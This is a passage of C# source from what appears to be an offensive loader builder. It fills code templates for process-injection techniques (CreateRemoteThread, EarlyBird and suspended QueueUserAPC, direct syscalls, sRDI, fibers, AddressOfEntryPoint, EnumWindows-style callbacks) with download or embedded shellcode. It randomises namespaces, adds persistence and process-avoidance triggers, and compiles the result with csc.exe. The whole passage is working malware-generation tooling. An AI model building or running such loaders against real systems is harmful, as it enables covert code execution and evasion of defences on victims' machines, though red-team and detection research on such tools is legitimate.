                    Regex QueuePattern;
                    //Clear remaining trigger.
                    QueuePattern = new Regex("{{TRIGGER}}");
                    CSContents = QueuePattern.Replace(CSContents, "");
                    QueuePattern = new Regex("{{MODE}}");
                    CSContents = QueuePattern.Replace(CSContents, ADDRESSOFENTRYPOINT.DYNAMICMODE);
                    QueuePattern = new Regex("{{SPAWN}}");
                    CSContents = QueuePattern.Replace(CSContents, "parsedArgs.Spawn");
                    QueuePattern = new Regex("{{NAMESPACE}}");
                    CSContents = QueuePattern.Replace(CSContents, GenRandomString());
                    QueuePattern = new Regex("{{ARGS}}");
                    CSContents = QueuePattern.Replace(CSContents, ADDRESSOFENTRYPOINT.DYNAMICARGPARSE);
                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true);
                }
            }
            else if (injMode == "DOWNLOAD")
            {
                if (injTechnique == "CreateRemoteThread")
                {
                    Program.WriteLog(injMode + ": " + injTechnique, true);
                    string CSContents = DLL_CRT.BODY;
                    CSContents = ParseTriggers(CSContents);

                    Regex DLLCRTPattern;
                    DLLCRTPattern = new Regex("{{TRIGGER}}");
                    CSContents = DLLCRTPattern.Replace(CSContents, "");
                    DLLCRTPattern = new Regex("{{MODE}}");
                    CSContents = DLLCRTPattern.Replace(CSContents, DLL_CRT.DOWNLOADMODE);
                    DLLCRTPattern = new Regex("{{NAMESPACE}}");
                    CSContents = DLLCRTPattern.Replace(CSContents, GenRandomString());
                    DLLCRTPattern = new Regex("{{ARGS}}");
                    CSContents = DLLCRTPattern.Replace(CSContents, DLL_CRT.DOWNLOADARGPARSE);

                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                } 
                else if (injTechnique == "EarlyBird_QueueUserAPC")
                {
                    Program.WriteLog(injMode + ": " + injTechnique, true);
                    string CSContents = EB_QUAPC.BODY;
                    CSContents = ParseTriggers(CSContents);

                    Regex QueuePattern;
                    //Clear remaining trigger.
                    QueuePattern = new Regex("{{TRIGGER}}");
                    CSContents = QueuePattern.Replace(CSContents, "");
                    QueuePattern = new Regex("{{MODE}}");
                    CSContents = QueuePattern.Replace(CSContents, EB_QUAPC.DOWNLOADMODE);
                    QueuePattern = new Regex("{{SPAWN}}");
                    CSContents = QueuePattern.Replace(CSContents, "parsedArgs.Spawn");
                    QueuePattern = new Regex("{{NAMESPACE}}");
                    CSContents = QueuePattern.Replace(CSContents, GenRandomString());
                    QueuePattern = new Regex("{{ARGS}}");
                    CSContents = QueuePattern.Replace(CSContents, EB_QUAPC.DOWNLOADARGPARSE);

                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                }
                else if (injTechnique == "Suspend_QueueUserAPC")
                {
                    Program.WriteLog(injMode + ": " + injTechnique, true);
                    string CSContents = Suspend_QueueUserAPC.BODY;
                    CSContents = ParseTriggers(CSContents);

                    Regex QueuePattern;
                    //Clear remaining trigger.
                    QueuePattern = new Regex("{{TRIGGER}}");
                    CSContents = QueuePattern.Replace(CSContents, "");
                    QueuePattern = new Regex("{{MODE}}");
                    CSContents = QueuePattern.Replace(CSContents, Suspend_QueueUserAPC.DOWNLOADMODE);
                    QueuePattern = new Regex("{{NAMESPACE}}");
                    CSContents = QueuePattern.Replace(CSContents, GenRandomString());
                    QueuePattern = new Regex("{{ARGS}}");
                    CSContents = QueuePattern.Replace(CSContents, Suspend_QueueUserAPC.DOWNLOADARGPARSE);

                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                }
                else if (injTechnique == "Syscall_CreateThread")
                {
                    Program.WriteLog(injMode + ": " + injTechnique, true);
                    string CSContents = SYSCALL_CT.BODY;
                    CSContents = ParseTriggers(CSContents);

                    Regex syscallPattern;
                    //Clear remaining trigger.
                    syscallPattern = new Regex("{{TRIGGER}}");
                    CSContents = syscallPattern.Replace(CSContents, "");
                    syscallPattern = new Regex("{{MODE}}");
                    CSContents = syscallPattern.Replace(CSContents, SYSCALL_CT.DOWNLOAD);
                    syscallPattern = new Regex("{{NAMESPACE}}");
                    CSContents = syscallPattern.Replace(CSContents, GenRandomString());
                    syscallPattern = new Regex("{{ARGS}}");
                    CSContents = syscallPattern.Replace(CSContents, SYSCALL_CT.DOWNLOAD_ARGPARSE);
                    
                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true);
                }
                else if (injTechnique == "SRDI")
                {
                    Program.WriteLog(injMode + ": " + injTechnique, true);
                    string CSContents = sRDI.BODY;
                    CSContents = ParseTriggers(CSContents);

                    Regex replacePattern;
                    //Clear remaining trigger.
                    replacePattern = new Regex("{{TRIGGER}}");
                    CSContents = replacePattern.Replace(CSContents, "");
                    replacePattern = new Regex("{{MODE}}");
                    CSContents = replacePattern.Replace(CSContents, sRDI.DOWNLOADMODE);
                    replacePattern = new Regex("{{NAMESPACE}}");
                    CSContents = replacePattern.Replace(CSContents, GenRandomString());
                    replacePattern = new Regex("{{ARGS}}");
                    CSContents = replacePattern.Replace(CSContents, sRDI.DOWNLOADARGS);

                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true);
                }
                else if (injTechnique == "Fiber_Execution")
                {
                    Program.WriteLog(injMode + ": " + injTechnique, true);
                    string CSContents = FiberInject.Body;
                    CSContents = ParseTriggers(CSContents);

                    Regex regPattern;
                    //Clear remaining trigger.
                    regPattern = new Regex("{{TRIGGER}}");
                    CSContents = regPattern.Replace(CSContents, "");
                    regPattern = new Regex("{{MODE}}");
                    CSContents = regPattern.Replace(CSContents, FiberInject.DOWNLOAD);
                    regPattern = new Regex("{{NAMESPACE}}");
                    CSContents = regPattern.Replace(CSContents, GenRandomString());
                    regPattern = new Regex("{{ARGS}}");
                    CSContents = regPattern.Replace(CSContents, FiberInject.DOWNLOAD_ARGPARSE);
                    
                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                }
                else if (injTechnique == "EnumWindows")
                {
                    Program.WriteLog(injMode + ": " + injTechnique, true);
                    string CSContents = EnumWindows.Body;
                    CSContents = ParseTriggers(CSContents);

                    Regex regPattern;
                    //Clear remaining trigger.
                    regPattern = new Regex("{{TRIGGER}}");
                    CSContents = regPattern.Replace(CSContents, "");
                    regPattern = new Regex("{{MODE}}");
                    CSContents = regPattern.Replace(CSContents, EnumWindows.DOWNLOAD);
                    regPattern = new Regex("{{NAMESPACE}}");
                    CSContents = regPattern.Replace(CSContents, GenRandomString());
                    regPattern = new Regex("{{ARGS}}");
                    CSContents = regPattern.Replace(CSContents, EnumWindows.DOWNLOAD_ARGPARSE);
                    
                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                }
                else if (injTechnique == "EnumChildWindows")
                {
                    Program.WriteLog(injMode + ": " + injTechnique, true);
                    string CSContents = EnumChildWindows.Body;
                    CSContents = ParseTriggers(CSContents);

                    Regex regPattern;
                    //Clear remaining trigger.
                    regPattern = new Regex("{{TRIGGER}}");
                    CSContents = regPattern.Replace(CSContents, "");
                    regPattern = new Regex("{{MODE}}");
                    CSContents = regPattern.Replace(CSContents, EnumChildWindows.DOWNLOAD);
                    regPattern = new Regex("{{NAMESPACE}}");
                    CSContents = regPattern.Replace(CSContents, GenRandomString());
                    regPattern = new Regex("{{ARGS}}");
                    CSContents = regPattern.Replace(CSContents, EnumChildWindows.DOWNLOAD_ARGPARSE);
                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                }
                else if (injTechnique == "EnumDateFormatsEx")
                {
                    Program.WriteLog(injMode + ": " + injTechnique, true);
                    string CSContents = EnumDateFormatsEx.Body;
                    CSContents = ParseTriggers(CSContents);

                    Regex regPattern;
                    //Clear remaining trigger.
                    regPattern = new Regex("{{TRIGGER}}");
                    CSContents = regPattern.Replace(CSContents, "");
                    regPattern = new Regex("{{MODE}}");
                    CSContents = regPattern.Replace(CSContents, EnumDateFormatsEx.DOWNLOAD);
                    regPattern = new Regex("{{NAMESPACE}}");
                    CSContents = regPattern.Replace(CSContents, GenRandomString());
                    regPattern = new Regex("{{ARGS}}");
                    CSContents = regPattern.Replace(CSContents, EnumDateFormatsEx.DOWNLOAD_ARGPARSE);
                    
                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                }
                else if (injTechnique == "EnumDesktops")
                {
                    Program.WriteLog(injMode + ": " + injTechnique, true);
                    string CSContents = EnumDesktops.Body;
                    CSContents = ParseTriggers(CSContents);

                    Regex regPattern;
                    //Clear remaining trigger.
                    regPattern = new Regex("{{TRIGGER}}");
                    CSContents = regPattern.Replace(CSContents, "");
                    regPattern = new Regex("{{MODE}}");
                    CSContents = regPattern.Replace(CSContents, EnumDesktops.DOWNLOAD);
                    regPattern = new Regex("{{NAMESPACE}}");
                    CSContents = regPattern.Replace(CSContents, GenRandomString());
                    regPattern = new Regex("{{ARGS}}");
                    CSContents = regPattern.Replace(CSContents, EnumDesktops.DOWNLOAD_ARGPARSE);
                    
                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                }
                else if (injTechnique == "AddressOfEntryPoint")
                {
                    Program.WriteLog(injMode + ": " + injTechnique, true);
                    string CSContents = ADDRESSOFENTRYPOINT.BODY;
                    CSContents = ParseTriggers(CSContents);

                    Regex QueuePattern;
                    //Clear remaining trigger.
                    QueuePattern = new Regex("{{TRIGGER}}");
                    CSContents = QueuePattern.Replace(CSContents, "");
                    QueuePattern = new Regex("{{MODE}}");
                    CSContents = QueuePattern.Replace(CSContents, ADDRESSOFENTRYPOINT.DOWNLOADMODE);
                    QueuePattern = new Regex("{{SPAWN}}");
                    CSContents = QueuePattern.Replace(CSContents, "parsedArgs.Spawn");
                    QueuePattern = new Regex("{{NAMESPACE}}");
                    CSContents = QueuePattern.Replace(CSContents, GenRandomString());
                    QueuePattern = new Regex("{{ARGS}}");
                    CSContents = QueuePattern.Replace(CSContents, ADDRESSOFENTRYPOINT.DOWNLOADARGPARSE);

                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true);
                }

            }
        }

        /// <summary>
        /// WriteCS takes the CSContents, and writes it to a .cs file for compilation by CompileCS.
        /// </summary>
        /// <param name="CSContents"> The massive string created by CSConstructor.</param>
        /// <param name="injTechnique">Injection technique selected.</param>
        /// <param name="outputDirectory"> Directory to store output.</param>
        /// <param name="isUnsafe"> whether or not csc.exe's unsafe parameter should be used when passing data to CompileCS</param>
        /// <returns></returns>
        public static void WriteCS(string CSContents, string injTechnique, string outputDirectory, bool isUnsafe)
        {
            string outputPath;
            try
            {
                if (!Directory.Exists(outputDirectory + @"\" + injTechnique))
                {
                    Directory.CreateDirectory(outputDirectory + @"\" + injTechnique);
                }
                outputPath = outputDirectory + @"\" + Settings.SelectedTechnique + @"\" + Path.GetRandomFileName().Split('.')[0] + ".cs"; //File extension is randomly generated, but we just want the base filename.;
                File.WriteAllText(outputPath, CSContents);
                if (File.Exists(outputPath))
                {
                    string hash = BytesToString(CalculateSHA256(outputPath));
                    Console.WriteLine("|   [*] Wrote: {0}", outputPath);
                    WriteLog(String.Join(" ", new string[] { "Wrote", outputPath, "::", hash}), true);
                    if (Settings.CompileBinary)
                    {
                        CompileCS(outputPath, isUnsafe);
                    }
                }
                else
                {
                    Console.WriteLine("|    [!] Error writing {0} not found. Exiting build...");
                    return;
                }

            }
            catch (Exception)
            {
                Console.WriteLine("\n|    [!] Unable to create .cs, please build again.");
                return;
            }
        }


        /// <summary>
        /// Spawns a new csc.exe process to compile the .cs file created by WriteCS;
        /// </summary>
        /// <param name="filepath">The path to the .cs file created by WriteCS</param>
        /// <param name="unsafeCode">whether or not csc.exe's unsafe parameter should be used</param>
        /// <returns></returns>
        public static bool CompileCS(string filepath, bool unsafeCode)
        {
            if (File.Exists(Settings.SelectedCompilerPath))
            {
                try
                {
                    string binPath = filepath.Split('.')[0] + ".exe";
                    var p = new System.Diagnostics.Process();
                    p.StartInfo.FileName = Settings.SelectedCompilerPath;
                    if (!unsafeCode)
                    {
                        p.StartInfo.Arguments = string.Format(" -out:{0} {1}", binPath, filepath);
                    }
                    else if (unsafeCode)
                    {
                        p.StartInfo.Arguments = string.Format(" -unsafe -out:{0} {1}", binPath, filepath);
                    }
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.CreateNoWindow = true;
                    p.Start();
                    p.StandardOutput.ReadToEnd();
                    
                    if (File.Exists(binPath)) {
                        string hash = BytesToString(CalculateSHA256(binPath));
                        Console.WriteLine("|   [+] Compiled: {0}", binPath);
                        WriteLog(String.Join(" ",new string[] { "Compiled", binPath,"::",hash }), true);
                    }
                    else
                    {
                        WriteLog(String.Join(" ", new string[] { "[!] Error Compiling:", binPath}), true);
                    }
                    return true;
                }
                catch (Exception) 
                {
                    return false;
                }
            }
            else
            {
                Console.WriteLine("|\n|   [!] Compile Error: {0} not found.", Settings.SelectedCompilerPath);
                return false;
            }
        }

        /// <summary>
        /// Calculates the SHA256 Checksum for the .cs file and binary.
        /// </summary>
        /// <param name="filename"></param>
        /// <returns></returns>
        public static byte[] CalculateSHA256(string filename){
            SHA256 Sha256 = SHA256.Create();
            using (FileStream stream = File.OpenRead(filename))
            {
                return Sha256.ComputeHash(stream);
            }
        }

        public static void WriteLog(string entry, bool timestamp)
        {
            if (!Settings.Logging)
            {
                return;
            }
            DateTime today = DateTime.Now;
            string logName = "Single_Dose[" + today.Month.ToString() + "-" + today.Day.ToString()+"].log";

            if (Settings.OutputDirectory == null)
            {
                Settings.LogBuffer = Settings.LogBuffer + String.Join(" ", new string[] { DateTime.UtcNow.ToString(), ":", entry });
                return;
            }

            if (Settings.CurrentLogFile != Settings.OutputDirectory + "\\" + logName)
            {
                Settings.CurrentLogFile = logName;
            }
            
            using (StreamWriter writer = File.AppendText(Settings.OutputDirectory +"\\" + logName))
            {
                if (timestamp)
                {
                    writer.WriteLine("{0}: {1}", DateTime.UtcNow, entry);
                }
                else
                {
                    writer.WriteLine("{0}", entry);
                }
                writer.Close();
            }
        }

        /// <summary>
        /// Used to convert the byte[] from CalculateSHA256 to a string.
        /// </summary>
        /// <param name="bytes"></param>
        /// <returns></returns>
        public static string BytesToString(byte[] bytes)
        {
            string result = "";
            foreach (byte b in bytes) result += b.ToString("x2");
            return result;
        }

        public static string ShellcodeBytesToString(byte[] buffer, int blockSize, string variableName)
        {
            List<string> Completed = new List<string>();
            byte[][] blocks = new byte[(buffer.Length + blockSize - 1) / blockSize][];

            for (int i = 0, j = 0; i < blocks.Length; i++, j += blockSize)
            {
                blocks[i] = new byte[Math.Min(blockSize, buffer.Length - j)];
                Array.Copy(buffer, j, blocks[i], 0, blocks[i].Length);
            }

            string result = "";
            Completed.Add("byte[] " + variableName + " = new byte[1000];");
            foreach (byte[] block in blocks)
            {
                //Console.WriteLine(block.Length);
                //" 0x" +
                result += variableName + " = new byte[]{ 0x" + BitConverter.ToString(block).Replace("-", ", 0x") + "};\n            foreach(byte b in "+variableName+"){payloadList.Add(b);}";
                Completed.Add(result);
                result = "";
            }
            return String.Join("\n            ", Completed.ToArray());
        }

        /// <summary>
        /// Used for formatting shellcode into a single csv string. Only used in static mode.
        /// </summary>
        /// <param name="ba"></param>
        /// <returns></returns>
        public static string ByteArrayToString(byte[] ba)
        {
            return System.BitConverter.ToString(ba).Replace("-", ", 0x");
        }

        private static string ParseTriggers(string CSContents)
        {
            Regex regPattern;
            foreach (var trig in TriggersToUse)
            {
                if (trig == "REQUIRETRIGGER")
                {
                    regPattern = new Regex("{{TRIGGER}}");
                    CSContents = regPattern.Replace(CSContents, REQUIRETRIGGER);
                    regPattern = new Regex("{{REQUIREMENTS}}");
                    CSContents = regPattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
                }

                if (trig == "HIBERNATETRIGGER")
                {
                    regPattern = new Regex("{{TRIGGER}}");
                    CSContents = regPattern.Replace(CSContents, HIBERNATETRIGGER);
                    regPattern = new Regex("{{REQUIREMENTS}}");
                    CSContents = regPattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
                }
                if (trig == "AVOIDTRIGGER")
                {
                    regPattern = new Regex("{{TRIGGER}}");
                    CSContents = regPattern.Replace(CSContents, AVOIDTRIGGER);
                    regPattern = new Regex("{{REQUIREMENTS}}");
                    CSContents = regPattern.Replace(CSContents, AVOIDPROCESSDETAILS);
                }
                if (trig == "PERSISTTRIGGER")
                {
                    regPattern = new Regex("{{TRIGGER}}");
                    CSContents = regPattern.Replace(CSContents, PERSISTTRIGGER);
                    regPattern = new Regex("{{REQUIREMENTS}}");
                    CSContents = regPattern.Replace(CSContents, PERSISTPROCESSDETAILS);
                }
            }

            return CSContents;
        }

        public static string GenRandomString()
        {
            Random random = new Random();
            int length = random.Next(3,9);
            var rString = "";
            for (var i = 0; i < length; i++)
            {
                rString += ((char)(random.Next(1, 26) + 64)).ToString().ToLower();
            }
            return rString;
        }
    }
}
